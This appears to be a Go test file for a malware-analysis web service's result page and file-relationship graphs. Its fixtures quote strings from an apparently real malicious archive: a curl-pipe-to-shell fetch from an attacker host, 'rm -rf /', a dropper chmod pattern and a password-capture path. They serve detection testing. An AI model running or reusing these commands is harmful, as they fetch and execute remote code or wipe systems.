package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"html/template"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"codeberg.org/atomdrift/hopper"
)

func init() {
	// prepareResultData uses the package-level logger; main() normally sets it.
	if logger == nil {
		logger = slog.New(slog.DiscardHandler)
	}
}

// TestRouteSetup ensures all route patterns are valid.
// http.ServeMux.HandleFunc panics on a bad pattern (e.g. wildcards with a suffix
// like "{sha256}.json"), so calling newMux() here catches that before production.
func TestRouteSetup(t *testing.T) {
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("route registration panicked: %v", r)
		}
	}()
	newMux()
}

func TestSecurityHeadersScriptNonce(t *testing.T) {
	handler := securityHeaders(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		nonce := getNonce(r)
		if nonce == "" {
			t.Fatal("nonce missing from request context")
		}
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(`<script nonce="` + nonce + `" src="/static/upload.js"></script>`))
	}))

	rr := httptest.NewRecorder()
	handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/", http.NoBody))

	csp := rr.Header().Get("Content-Security-Policy")
	if !strings.Contains(csp, "script-src 'self' 'nonce-") {
		t.Fatalf("CSP missing script nonce: %q", csp)
	}
	if !strings.Contains(csp, "script-src-elem 'self' 'nonce-") {
		t.Fatalf("CSP missing script-src-elem nonce: %q", csp)
	}
	if !strings.Contains(rr.Body.String(), `<script nonce="`) {
		t.Fatalf("response missing script nonce: %q", rr.Body.String())
	}
}

func TestHopperFileURL(t *testing.T) {
	old := hopperAPIAddr
	defer func() { hopperAPIAddr = old }()

	sha := strings.Repeat("a", 64)
	hopperAPIAddr = "hopper-api:8081"
	if got, want := hopperFileURL(sha), "http://hopper-api:8081/api/file/"+sha; got != want {
		t.Fatalf("hopperFileURL without scheme = %q, want %q", got, want)
	}

	hopperAPIAddr = "https://hopper.example/internal/"
	if got, want := hopperFileURL(sha), "https://hopper.example/internal/api/file/"+sha; got != want {
		t.Fatalf("hopperFileURL with path = %q, want %q", got, want)
	}
}

func TestSampleTimeUsesNewestTimestamp(t *testing.T) {
	created := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
	mtime := created.Add(1 * time.Hour)
	analyzed := created.Add(2 * time.Hour)
	updated := created.Add(3 * time.Hour)

	got := sampleTime(&hopper.Sample{
		CreatedAt:  created,
		Mtime:      &mtime,
		AnalyzedAt: &analyzed,
		UpdatedAt:  updated,
	})
	if !got.Equal(updated) {
		t.Fatalf("sampleTime = %s, want newest timestamp %s", got, updated)
	}
}

func TestPrepareResultDataSeparatesFirstSeenAndAnalyzed(t *testing.T) {
	created := time.Now().UTC().Add(-48 * time.Hour)
	analyzed := time.Now().UTC().Add(-2 * time.Hour)
	raw := `{"ml":{"thresholds":[0.65,0.887],"fs":[{"id":0,"prob":0.1,"class":0}]},"raw":{"fs":[{"id":0,"sha":"` +
		strings.Repeat("a", 64) + `","type":"pe","dp":0,"f":"K","sz":12}]}}`

	data := prepareResultData("sample.exe", strings.Repeat("a", 64), &storedResult{
		RawLitmus:      raw,
		Classification: "benign",
		CachedAt:       analyzed,
		CreatedAt:      created,
		AnalyzedAt:     analyzed,
	})

	if data.FirstSeenAt == "" || data.FirstSeenAgo == "" {
		t.Fatalf("first seen fields missing: %+v", data)
	}
	if data.AnalyzedAt == "" || data.AnalyzedAgo == "" {
		t.Fatalf("analyzed fields missing: %+v", data)
	}
	if data.FirstSeenAt == data.AnalyzedAt {
		t.Fatalf("first seen and analyzed should be distinct, both are %q", data.FirstSeenAt)
	}
}

func TestBuildMalecule_Empty(t *testing.T) {
	mol := BuildMalecule(nil, "")
	if len(mol.Atoms) != 0 {
		t.Errorf("expected 0 atoms for empty findings, got %d", len(mol.Atoms))
	}
}

func TestBuildMalecule_RingLayout(t *testing.T) {
	findings := []FindingForFormula{
		{ID: "objectives/payload/execute", Severity: SeverityHostile},
		{ID: "micro-behaviors/crypto/xor-loop", Severity: SeveritySuspicious},
	}
	mol := BuildMalecule(findings, "PE·Ob₁H₁")

	if len(mol.Atoms) < 2 {
		t.Fatalf("expected at least 2 atoms, got %d", len(mol.Atoms))
	}

	// Ring atoms should exist
	ringCount := 0
	for _, a := range mol.Atoms {
		if a.Ring {
			ringCount++
		}
	}
	if ringCount < 2 {
		t.Errorf("expected at least 2 ring atoms, got %d", ringCount)
	}

	// All atoms should have valid coordinates (not all zero)
	allZero := true
	for _, a := range mol.Atoms {
		if a.X != 0 || a.Y != 0 {
			allZero = false
			break
		}
	}
	if allZero {
		t.Error("all atoms have zero coordinates — layout not applied")
	}

	// Bonds should exist
	if len(mol.Bonds) == 0 {
		t.Error("expected bonds, got none")
	}
}

func TestBuildMalecule_CollapsedSeverity(t *testing.T) {
	// A single-chain finding like well-known/malware/supply-chain/x should collapse
	// into the ring atom and preserve its severity, not be forced neutral.
	findings := []FindingForFormula{
		{ID: "well-known/malware/supply-chain/homabrews", Severity: SeveritySuspicious},
		{ID: "objectives/payload/execute", Severity: SeverityHostile},
	}
	mol := BuildMalecule(findings, "K₁O₁")

	// Find the well-known ring atom (symbol K)
	var kAtom *MaleculeAtom
	for i := range mol.Atoms {
		if mol.Atoms[i].Symbol == "K" && mol.Atoms[i].Ring {
			kAtom = &mol.Atoms[i]
			break
		}
	}
	if kAtom == nil {
		t.Fatal("expected ring atom with symbol K for well-known category")
	}

	// K should have suspicious severity (from collapsed chain), not neutral
	if kAtom.Severity == "neutral" {
		t.Errorf("ring atom K has severity %q, want %q — collapsed findings should preserve severity", kAtom.Severity, "suspicious")
	}

	// K should have the trait_id from the collapsed chain
	if kAtom.TraitID == "" {
		t.Error("ring atom K has empty TraitID — collapsed findings should be preserved")
	}
}

func TestBuildMalecule_NoBrokenBonds(t *testing.T) {
	findings := []FindingForFormula{
		{ID: "objectives/payload/execute", Severity: SeverityHostile},
		{ID: "objectives/exfil/upload", Severity: SeverityHostile},
		{ID: "micro-behaviors/crypto/xor-loop", Severity: SeveritySuspicious},
		{ID: "micro-behaviors/fs/temp-write", Severity: SeverityNotable},
		{ID: "well-known/malware/mirai", Severity: SeveritySuspicious},
	}
	mol := BuildMalecule(findings, "test")

	atomCount := len(mol.Atoms)
	for i, bond := range mol.Bonds {
		if bond[0] < 0 || bond[0] >= atomCount || bond[1] < 0 || bond[1] >= atomCount {
			t.Errorf("bond %d references out-of-range atom: [%d, %d] (atom count: %d)", i, bond[0], bond[1], atomCount)
		}
	}
}

func TestBuildMalecule_StructuralRingNeutral(t *testing.T) {
	// Ring atoms that are purely structural (children but no direct traits)
	// should remain neutral. Here, objectives and micro-behaviors each have
	// children, so they form ring atoms without direct traitIDs.
	findings := []FindingForFormula{
		{ID: "objectives/payload/execute", Severity: SeverityHostile},
		{ID: "micro-behaviors/crypto/xor-loop", Severity: SeveritySuspicious},
	}
	mol := BuildMalecule(findings, "O₁H₁")

	for _, a := range mol.Atoms {
		if a.Ring && a.TraitID == "" && a.Severity != "neutral" {
			t.Errorf("structural ring atom %q (category %q) has severity %q, want %q",
				a.Symbol, a.Category, a.Severity, "neutral")
		}
	}
}

func TestBuildGalaxy_DropperDetection(t *testing.T) {
	// Simulate files from midd.zip
	// update.html contains "https://img.spoolsv.cc/seed.php" -> references seed.php
	files := []FileFindings{
		{
			Path: "/tmp/midd.zip!!555.mp5",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/execution/tty", Severity: SeverityNotable},
			},
			Strings: []string{
				"socket", "connect", "recv", "send",
			},
		},
		{
			Path: "/tmp/midd.zip!!seed.php",
			Risk: "suspicious",
			Findings: []FindingForFormula{
				{ID: "objectives/persistence/cron", Severity: SeveritySuspicious},
			},
			Strings: []string{
				"curl -s http://img.spoolsv.cc/snn50.txt|sh",
			},
		},
		{
			Path: "/tmp/midd.zip!!terminal.go",
			Risk: "hostile",
			Findings: []FindingForFormula{
				{ID: "objectives/credential-access/capture", Severity: SeverityHostile},
			},
			Strings: []string{
				"term.ReadPassword", "AppendFile", "/usr/share/nano/.lock",
			},
		},
		{
			Path: "/tmp/midd.zip!!update.html",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/anti-static/obfuscation", Severity: SeverityNotable},
			},
			Strings: []string{
				"https://img.spoolsv.cc/seed.php", // References seed.php!
			},
		},
	}

	galaxy := BuildGalaxy(files)

	if !galaxy.IsGalaxy {
		t.Fatal("expected IsGalaxy to be true")
	}

	if len(galaxy.Molecules) != 4 {
		t.Fatalf("expected 4 molecules, got %d", len(galaxy.Molecules))
	}

	// Find molecule indices
	updateIdx, seedIdx := -1, -1
	for i, mol := range galaxy.Molecules {
		if mol.Path == "/tmp/midd.zip!!update.html" {
			updateIdx = i
		}
		if mol.Path == "/tmp/midd.zip!!seed.php" {
			seedIdx = i
		}
	}

	if updateIdx == -1 {
		t.Fatal("update.html molecule not found")
	}
	if seedIdx == -1 {
		t.Fatal("seed.php molecule not found")
	}

	// Check for dropper link: update.html -> seed.php
	foundLink := false
	for _, link := range galaxy.Links {
		if link.From == updateIdx && link.To == seedIdx {
			foundLink = true
			break
		}
	}

	if !foundLink {
		t.Errorf("expected dropper link from update.html (idx %d) to seed.php (idx %d), got links: %+v",
			updateIdx, seedIdx, galaxy.Links)
	}
}

func TestBuildGalaxy_NoSelfReferences(t *testing.T) {
	files := []FileFindings{
		{
			Path: "/archive!!foo.sh",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/execution/shell", Severity: SeverityNotable},
			},
			Strings: []string{
				"foo.sh", // Self-reference should be ignored
				"bar.sh", // References bar.sh
			},
		},
		{
			Path: "/archive!!bar.sh",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/execution/shell", Severity: SeverityNotable},
			},
			Strings: []string{
				"echo hello",
			},
		},
	}

	galaxy := BuildGalaxy(files)

	// Should have link from foo.sh -> bar.sh, but NOT foo.sh -> foo.sh
	for _, link := range galaxy.Links {
		if link.From == link.To {
			t.Errorf("found self-referencing link: %+v", link)
		}
	}

	// Should have exactly one link
	if len(galaxy.Links) != 1 {
		t.Errorf("expected 1 link (foo->bar), got %d: %+v", len(galaxy.Links), galaxy.Links)
	}
}

func TestBuildGalaxy_SingleFile(t *testing.T) {
	files := []FileFindings{
		{
			Path: "/single.exe",
			Risk: "hostile",
			Findings: []FindingForFormula{
				{ID: "objectives/impact/ransomware", Severity: SeverityHostile},
			},
			Strings: []string{"encrypt", "bitcoin"},
		},
	}

	galaxy := BuildGalaxy(files)

	if galaxy.IsGalaxy {
		t.Error("single file should not be a galaxy")
	}
}

func TestBuildGalaxy_ArchiveWithSingleInnerFile(t *testing.T) {
	// An archive container + one inner file should NOT produce a galaxy.
	// BuildGalaxy filters to archive contents (!! paths), leaving 1 file.
	// The caller should fall back to BuildMalecule for the single file.
	files := []FileFindings{
		{
			Path:     "/tmp/sample.zip",
			Risk:     "suspicious",
			Findings: []FindingForFormula{{ID: "metadata/format/zip", Severity: SeverityNotable}},
		},
		{
			Path:     "/tmp/sample.zip!!malware.exe",
			Risk:     "hostile",
			Findings: []FindingForFormula{{ID: "objectives/payload/execute", Severity: SeverityHostile}},
		},
	}

	galaxy := BuildGalaxy(files)

	if galaxy.IsGalaxy {
		t.Error("archive with single inner file should not be a galaxy")
	}

	// Verify that BuildMalecule produces a real molecule when the inner file
	// has enough findings to form a structure (multiple categories).
	multiFindings := []FindingForFormula{
		{ID: "objectives/payload/execute", Severity: SeverityHostile},
		{ID: "micro-behaviors/crypto/xor-loop", Severity: SeveritySuspicious},
	}
	mol := BuildMalecule(multiFindings, "PE·Ex₁H₁")
	if len(mol.Atoms) == 0 {
		t.Error("BuildMalecule should produce atoms for the inner file's findings")
	}
}

func TestBuildGalaxy_MoleculePositioning(t *testing.T) {
	files := []FileFindings{
		{
			Path:     "/a.txt",
			Risk:     "notable",
			Findings: []FindingForFormula{{ID: "objectives/test/a", Severity: SeverityNotable}},
			Strings:  []string{},
		},
		{
			Path:     "/b.txt",
			Risk:     "notable",
			Findings: []FindingForFormula{{ID: "objectives/test/b", Severity: SeverityNotable}},
			Strings:  []string{},
		},
		{
			Path:     "/c.txt",
			Risk:     "notable",
			Findings: []FindingForFormula{{ID: "objectives/test/c", Severity: SeverityNotable}},
			Strings:  []string{},
		},
	}

	galaxy := BuildGalaxy(files)

	if len(galaxy.Molecules) != 3 {
		t.Fatalf("expected 3 molecules, got %d", len(galaxy.Molecules))
	}

	// Check that molecules have different positions
	for i := range galaxy.Molecules {
		for j := i + 1; j < len(galaxy.Molecules); j++ {
			mi, mj := galaxy.Molecules[i], galaxy.Molecules[j]
			if mi.CenterX == mj.CenterX && mi.CenterY == mj.CenterY && mi.CenterZ == mj.CenterZ {
				t.Errorf("molecules %d and %d have same position", i, j)
			}
		}
	}
}

func TestBuildGalaxy_BasenameExtraction(t *testing.T) {
	// Test that we correctly extract basenames from archive paths
	files := []FileFindings{
		{
			Path:     "/tmp/test.zip!!subdir/dropper.sh",
			Risk:     "suspicious",
			Findings: []FindingForFormula{{ID: "objectives/execution/shell", Severity: SeveritySuspicious}},
			Strings:  []string{"./payload.exe", "chmod +x payload.exe"},
		},
		{
			Path:     "/tmp/test.zip!!payload.exe",
			Risk:     "hostile",
			Findings: []FindingForFormula{{ID: "objectives/impact/wiper", Severity: SeverityHostile}},
			Strings:  []string{"rm -rf /"},
		},
	}

	galaxy := BuildGalaxy(files)

	if len(galaxy.Links) != 1 {
		t.Errorf("expected 1 link (dropper.sh -> payload.exe), got %d: %+v", len(galaxy.Links), galaxy.Links)
	}
}

func TestBuildGalaxy_RealMiddZipData(t *testing.T) {
	// This test simulates the actual midd.zip file structure from cleave output
	// terminal.go references update.html in its strings
	// But update.html has no findings, so it won't be in the galaxy
	// This test verifies the behavior with real-world-like data
	files := []FileFindings{
		{
			Path: "/tmp/midd.zip!!555.mp5",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/execution/tty", Severity: SeverityNotable},
				{ID: "objectives/anti-analysis/timing", Severity: SeverityNotable},
			},
			Strings: []string{
				"socket", "connect", "recv", "send", "openpty",
			},
		},
		{
			Path: "/tmp/midd.zip!!seed.php",
			Risk: "suspicious",
			Findings: []FindingForFormula{
				{ID: "micro-behaviors/process/create/methods::curl-pipe-sh", Severity: SeveritySuspicious},
				{ID: "objectives/persistence/cron/schedule::curl-s-flag", Severity: SeverityNotable},
			},
			// Note: cleave doesn't extract strings from small PHP files
			Strings: []string{},
		},
		{
			Path: "/tmp/midd.zip!!terminal.go",
			Risk: "hostile",
			Findings: []FindingForFormula{
				{ID: "objectives/credential-access/capture/input::password-exfil-file", Severity: SeverityHostile},
				{ID: "objectives/lateral-movement/supply-chain/impersonation::password-intercept", Severity: SeverityHostile},
			},
			// terminal.go has strings including references to update.html and seed.php
			Strings: []string{
				"io", "github.com/bitfield/script", "golang.org/x/term",
				"os/exec", "strings", "/usr/share/nano/.lock",
				"https://raw.githubusercontent.com/xinfeisoft/vue-element-admin/refs/heads/main/public/update.html",
				"/bin/sh", "-c", "term.ReadPassword",
				// Also add seed.php reference to test cross-file detection
				"http://img.spoolsv.cc/seed.php",
			},
		},
		{
			Path: "/tmp/midd.zip!!sss.mp5",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/anti-analysis/vm", Severity: SeverityNotable},
			},
			Strings: []string{
				"clock_gettime", "gettimeofday", "CPUID",
			},
		},
		// Note: update.html has no findings in real cleave output, so it's excluded
	}

	galaxy := BuildGalaxy(files)

	if !galaxy.IsGalaxy {
		t.Fatal("expected IsGalaxy to be true")
	}

	// Should have 4 molecules (update.html excluded because no findings)
	if len(galaxy.Molecules) != 4 {
		t.Fatalf("expected 4 molecules, got %d", len(galaxy.Molecules))
	}

	// Find indices
	terminalIdx, seedIdx := -1, -1
	for i, mol := range galaxy.Molecules {
		switch mol.Path {
		case "/tmp/midd.zip!!terminal.go":
			terminalIdx = i
		case "/tmp/midd.zip!!seed.php":
			seedIdx = i
		}
	}

	if terminalIdx == -1 {
		t.Fatal("terminal.go molecule not found")
	}
	if seedIdx == -1 {
		t.Fatal("seed.php molecule not found")
	}

	// terminal.go references seed.php in its strings
	foundLink := false
	for _, link := range galaxy.Links {
		if link.From == terminalIdx && link.To == seedIdx {
			foundLink = true
			break
		}
	}

	if !foundLink {
		t.Errorf("expected dropper link from terminal.go (idx %d) to seed.php (idx %d), links: %+v",
			terminalIdx, seedIdx, galaxy.Links)
	}

	t.Logf("Galaxy has %d molecules and %d links", len(galaxy.Molecules), len(galaxy.Links))
	for _, link := range galaxy.Links {
		t.Logf("  Link: %s -> %s",
			galaxy.Molecules[link.From].Path,
			galaxy.Molecules[link.To].Path)
	}
}

func TestBuildGalaxy_IntegrationWithCleave(t *testing.T) {
	// This test runs cleave directly on testdata/midd.zip and verifies
	// the galaxy building works with the cleave JSONL format that litmus nests in its response.

	// Skip if cleave not available or traits not configured
	traitsDir := os.Getenv("CLEAVE_TRAITS_DIR")
	if traitsDir == "" {
		t.Skipf("CLEAVE_TRAITS_DIR not set")
	}
	cmd := exec.Command("cleave", "--json", "--validate=false", "analyze", "testdata/midd.zip")
	cmd.Env = append(cmd.Environ(), "CLEAVE_TRAITS_DIR="+traitsDir)
	output, err := cmd.Output()
	if err != nil {
		t.Skipf("cleave not available or failed: %v", err)
	}

	// Parse JSONL output
	var files []FileFindings
	basenames := make(map[string]bool)

	for line := range strings.SplitSeq(string(output), "\n") {
		if line == "" {
			continue
		}

		var record struct {
			Type     string `json:"type"`
			Path     string `json:"path"`
			Risk     string `json:"risk"`
			Findings []struct {
				ID   string `json:"id"`
				Crit string `json:"crit"`
				Kind string `json:"kind"`
			} `json:"findings"`
			Strings []struct {
				Value string `json:"value"`
			} `json:"strings"`
		}

		if err := json.Unmarshal([]byte(line), &record); err != nil {
			continue
		}

		if record.Type != "file" {
			continue
		}

		// Track basenames (handle both "archive!!path" and plain "path" formats)
		path := record.Path
		if strings.Contains(path, "!!") {
			parts := strings.Split(path, "!!")
			path = parts[len(parts)-1]
		}
		basenames[path] = true

		var ff []FindingForFormula
		for _, f := range record.Findings {
			if f.Kind == "structural" || strings.HasPrefix(f.ID, "metadata/internal/") {
				continue
			}
			ff = append(ff, FindingForFormula{
				ID:       f.ID,
				Severity: critToSeverity(f.Crit),
			})
		}

		var strs []string
		for _, s := range record.Strings {
			strs = append(strs, s.Value)
		}

		if len(ff) > 0 {
			files = append(files, FileFindings{
				Path:     record.Path,
				Risk:     record.Risk,
				Findings: ff,
				Strings:  strs,
			})
		}
	}

	t.Logf("Parsed %d files from cleave JSONL", len(files))
	t.Logf("Basenames in archive: %v", basenames)

	for _, f := range files {
		t.Logf("  %s: %d findings, %d strings", f.Path, len(f.Findings), len(f.Strings))
		// Log strings that might reference other files
		for _, s := range f.Strings {
			for basename := range basenames {
				if strings.Contains(s, basename) {
					t.Logf("    String references %s: %s", basename, truncate(s, 80))
				}
			}
		}
	}

	if len(files) < 2 {
		t.Skipf("need at least 2 files with findings for galaxy test, got %d", len(files))
	}

	galaxy := BuildGalaxy(files)

	if !galaxy.IsGalaxy {
		t.Fatal("expected IsGalaxy to be true")
	}

	t.Logf("Galaxy: %d molecules, %d links", len(galaxy.Molecules), len(galaxy.Links))
	for _, link := range galaxy.Links {
		t.Logf("  Link: %s -> %s",
			galaxy.Molecules[link.From].Path,
			galaxy.Molecules[link.To].Path)
	}

	// The test documents the actual behavior - no assertion on link count
	// because it depends on the archive content
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// TestRenderHTMLPage renders a complete HTML page from a zipfile for visual inspection.
// The output is written to testdata/rendered.html which can be opened in a browser.
// Note: this test drives cleave directly to generate the nested cleave JSONL; verdict will
// show UNKNOWN since no litmus classification is provided.
func TestRenderHTMLPage(t *testing.T) {
	zipPath := "testdata/midd.zip"
	if _, err := os.Stat(zipPath); os.IsNotExist(err) {
		t.Skipf("testdata/midd.zip not found")
	}

	traitsDir := os.Getenv("CLEAVE_TRAITS_DIR")
	if traitsDir == "" {
		t.Skipf("CLEAVE_TRAITS_DIR not set")
	}
	if _, err := os.Stat(traitsDir); os.IsNotExist(err) {
		t.Skipf("traits directory not found: %s", traitsDir)
	}

	// Run cleave directly to generate the JSONL that litmus would normally nest in its response.
	cmd := exec.Command("cleave", "--json", "--validate=false", "analyze", zipPath)
	cmd.Env = append(cmd.Environ(), "CLEAVE_TRAITS_DIR="+traitsDir)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		t.Logf("stderr: %s", stderr.String())
		t.Skipf("cleave failed: %v", err)
	}

	// Compute SHA256 of the file
	data, err := os.ReadFile(zipPath)
	if err != nil {
		t.Fatalf("failed to read zipfile: %v", err)
	}
	hash := sha256.Sum256(data)
	sha256Hex := hex.EncodeToString(hash[:])

	// Wrap the raw cleave output in a synthetic litmus response so prepareResultData
	// can parse it via the new RawLitmus path. No Classification set — verdict will
	// render as UNKNOWN since no litmus classification is provided.
	syntheticLitmus, err := json.Marshal(map[string]json.RawMessage{
		"cleave": json.RawMessage(stdout.Bytes()),
	})
	if err != nil {
		t.Fatalf("failed to marshal synthetic litmus response: %v", err)
	}
	res := &storedResult{
		Filename:  "midd.zip",
		RawLitmus: string(syntheticLitmus),
	}

	// Prepare template data
	resultData := prepareResultData("midd.zip", sha256Hex, res)

	// Log what we got
	t.Logf("Formula: %s", resultData.Formula)
	t.Logf("Verdict: %s", resultData.Verdict)
	t.Logf("Risk: %s", resultData.RiskLevel)
	t.Logf("FileFindings: %d files", len(resultData.FileFindings))

	// Parse the template with required functions
	funcMap := template.FuncMap{
		"mul": func(a, b float64) float64 { return a * b },
	}
	tmpl, err := template.New("result.html").Funcs(funcMap).ParseFiles("templates/base.html", "templates/result.html")
	if err != nil {
		t.Fatalf("failed to parse template: %v", err)
	}

	// Render to buffer
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, resultData); err != nil {
		t.Fatalf("failed to execute template: %v", err)
	}

	// Write to file for visual inspection
	outputPath := "testdata/rendered.html"
	if err := os.WriteFile(outputPath, buf.Bytes(), 0o644); err != nil {
		t.Fatalf("failed to write output: %v", err)
	}

	t.Logf("Rendered %d bytes to %s", buf.Len(), outputPath)
	t.Logf("Open in browser: file://%s", absPath(outputPath))
}

func absPath(path string) string {
	if abs, err := os.Getwd(); err == nil {
		return abs + "/" + path
	}
	return path
}

// TestPrepareResultData_SingleFileArchiveCollapses verifies that when a zipfile
// wraps exactly one inner file, the archive container is dropped so traits,
// strings, symbols, sections, and metrics aren't duplicated.
func TestPrepareResultData_SingleFileArchiveCollapses(t *testing.T) {
	raw := map[string]any{
		"fs": []map[string]any{
			{
				"id":   1,
				"dp":   0,
				"path": "/tmp/wrapper.zip",
				"type": "zip",
				"sha":  "aaaa",
				"sz":   1024,
				"ts": []map[string]any{
					{"i": "metadata/format/zip", "d": "ZIP archive", "l": 3},
				},
				"ss": []any{[]any{0, "PK\x03\x04"}},
			},
			{
				"id":   2,
				"dp":   1,
				"path": "/tmp/wrapper.zip!!payload.exe",
				"type": "pe",
				"sha":  "bbbb",
				"sz":   2048,
				"ts": []map[string]any{
					{"i": "objectives/payload/execute", "d": "executes payload", "l": 4},
				},
				"ss":       []any{[]any{0, "malicious string"}},
				"is":       []string{"kernel32.dll!CreateProcessA"},
				"sections": []map[string]any{{"name": ".text", "size": 1024, "entropy": 6.5}},
				"ms":       map[string]any{"entropy": 7.2},
			},
		},
	}
	rawBytes, err := json.Marshal(raw)
	if err != nil {
		t.Fatalf("marshal raw: %v", err)
	}
	ml := map[string]any{
		"class":      2,
		"prob":       0.95,
		"thresholds": []float64{0.65, 0.887},
		"fs": []map[string]any{
			{"id": 1, "class": 1, "prob": 0.5},
			{"id": 2, "class": 2, "prob": 0.95},
		},
	}
	mlBytes, err := json.Marshal(ml)
	if err != nil {
		t.Fatalf("marshal ml: %v", err)
	}
	envelope, err := json.Marshal(map[string]json.RawMessage{
		"ml":  mlBytes,
		"raw": rawBytes,
	})
	if err != nil {
		t.Fatalf("marshal envelope: %v", err)
	}

	data := prepareResultData("wrapper.zip", strings.Repeat("a", 64), &storedResult{RawLitmus: string(envelope)})

	if data.IsArchive {
		t.Error("IsArchive should be false for single-inner-file zip (container collapsed)")
	}
	checks := []struct {
		name string
		n    int
	}{
		{"FileFindings", len(data.FileFindings)},
		{"FileStrings", len(data.FileStrings)},
		{"FileSymbols", len(data.FileSymbols)},
		{"FileSections", len(data.FileSections)},
		{"FileMetrics", len(data.FileMetrics)},
	}
	for _, c := range checks {
		if c.n > 1 {
			t.Errorf("%s: got %d entries, want <=1 (inner file only, no container duplication)", c.name, c.n)
		}
	}
	// The single remaining entry must be the inner file, not the zip container.
	if len(data.FileFindings) == 1 && data.FileFindings[0].Basename != "payload.exe" {
		t.Errorf("FileFindings kept %q; expected inner basename payload.exe", data.FileFindings[0].Basename)
	}
	if len(data.FileStrings) == 1 && data.FileStrings[0].Basename != "payload.exe" {
		t.Errorf("FileStrings kept %q; expected inner basename payload.exe", data.FileStrings[0].Basename)
	}
}

// TestPrepareResultData_MultiFileArchivePreserved verifies the collapse does
// not fire for archives with multiple inner files.
func TestPrepareResultData_MultiFileArchivePreserved(t *testing.T) {
	raw := map[string]any{
		"fs": []map[string]any{
			{
				"id": 1, "dp": 0, "path": "/tmp/bundle.zip", "type": "zip", "sha": "aaaa", "sz": 1024,
				"ts": []map[string]any{{"i": "metadata/format/zip", "d": "ZIP archive", "l": 3}},
			},
			{
				"id": 2, "dp": 1, "path": "/tmp/bundle.zip!!a.exe", "type": "pe", "sha": "bbbb", "sz": 2048,
				"ts": []map[string]any{{"i": "objectives/payload/execute", "d": "executes", "l": 4}},
			},
			{
				"id": 3, "dp": 1, "path": "/tmp/bundle.zip!!b.exe", "type": "pe", "sha": "cccc", "sz": 2048,
				"ts": []map[string]any{{"i": "objectives/payload/execute", "d": "executes", "l": 4}},
			},
		},
	}
	rawBytes, _ := json.Marshal(raw)
	ml := map[string]any{"class": 2, "prob": 0.9, "thresholds": []float64{0.65, 0.887}}
	mlBytes, _ := json.Marshal(ml)
	envelope, _ := json.Marshal(map[string]json.RawMessage{"ml": mlBytes, "raw": rawBytes})

	data := prepareResultData("bundle.zip", strings.Repeat("b", 64), &storedResult{RawLitmus: string(envelope)})

	if !data.IsArchive {
		t.Error("IsArchive should be true for multi-inner-file archive")
	}
	if len(data.FileFindings) < 2 {
		t.Errorf("FileFindings: got %d entries, want >=2 for multi-file archive", len(data.FileFindings))
	}
}
